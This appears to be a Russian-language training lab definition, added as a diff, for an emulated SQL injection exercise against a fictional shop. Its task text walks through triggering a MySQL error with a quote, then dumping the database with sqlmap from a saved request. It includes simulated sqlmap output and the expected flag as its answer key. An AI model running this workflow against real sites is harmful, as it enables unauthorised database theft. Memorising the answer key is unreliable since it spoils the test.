@@ -1,0 +1,29 @@
+{
+  "id": "web-tools-sqli",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{sqlm4p_r3qu3st_f1l3_dump5_th3_db}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: маршрут от подозрения к дампу\n\nМагазин `http://shop.t/product?id=10`. Есть cookie сессии, поэтому sqlmap\nнужно дать **реальный запрос** из файла `request.txt` (а не голый `-u`).\n\n1. Кавычка ломает запрос — это факт, а не подозрение:\n\n   curl -s 'http://shop.t/product?id=10%27'\n\n2. Посмотри сохранённый запрос (метод, cookie, тело):\n\n   cat request.txt\n\n3. Запусти sqlmap по файлу запроса в batch-режиме и выгрузи БД:\n\n   sqlmap -r request.txt -p id --batch --level 3 --risk 2 --dbms=mysql --dump\n\n4. В дампе таблицы `users` — пароль-флаг. Сохрани вывод в `found.txt` и набери `check`.\n" },
+    { "path": "/home/student/task/request.txt", "text": "GET /product?id=10 HTTP/1.1\nHost: shop.t\nCookie: PHPSESSID=9f3c2a7b1e\nUser-Agent: Mozilla/5.0\nAccept: text/html\n\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.t/product)",
+      "cases": [
+        { "match": "%27", "example": "-s 'http://shop.t/product?id=10%27'", "output": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''10''' at line 1\n" },
+        { "match": "id=10", "example": "-s 'http://shop.t/product?id=10'", "output": "<h1>Laptop</h1><p>price: 999.0</p>\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только http://shop.t/product?id=...\n"
+    },
+    "sqlmap": {
+      "help": "sqlmap -r <файл> -p <param> [--batch --dump] — эксплуатация SQLi по сохранённому запросу",
+      "cases": [
+        { "match": "--dump", "example": "-r request.txt -p id --batch --level 3 --risk 2 --dbms=mysql --dump", "output": "        ___\n       __H__\n ___ ___[\"]_____ ___ ___  {1.8.2#pip}\n|_ -| . [\"]     | .'| . |\n|___|_  [(]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[INFO] testing connection to the target URL\n[INFO] checking if the target is protected by some kind of WAF/IPS\n[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable\n[INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable\n[INFO] the back-end DBMS is MySQL\n[INFO] fetching tables for database: 'shop'\nDatabase: shop\n[2 tables]\n+-------+\n| users |\n| items |\n+-------+\n[INFO] fetching columns for table 'users'\n[INFO] fetching entries for table 'users'\nDatabase: shop\nTable: users\n[1 entry]\n+----+-------+--------------------------------------+\n| id | user  | password                             |\n+----+-------+--------------------------------------+\n| 1  | admin | nto{sqlm4p_r3qu3st_f1l3_dump5_th3_db} |\n+----+-------+--------------------------------------+\n" },
+        { "match": "-r|request\\.txt", "example": "-r request.txt -p id --batch", "output": "        ___\n       __H__\n ___ ___[\"]_____ ___ ___  {1.8.2#pip}\n\n[INFO] parsing HTTP request from 'request.txt'\n[INFO] GET parameter 'id' is injectable\n[INFO] the back-end DBMS is MySQL\n" }
+      ],
+      "fallback": "sqlmap: в этой лабе эмулируется только -r request.txt.\n"
+    }
+  }
+}
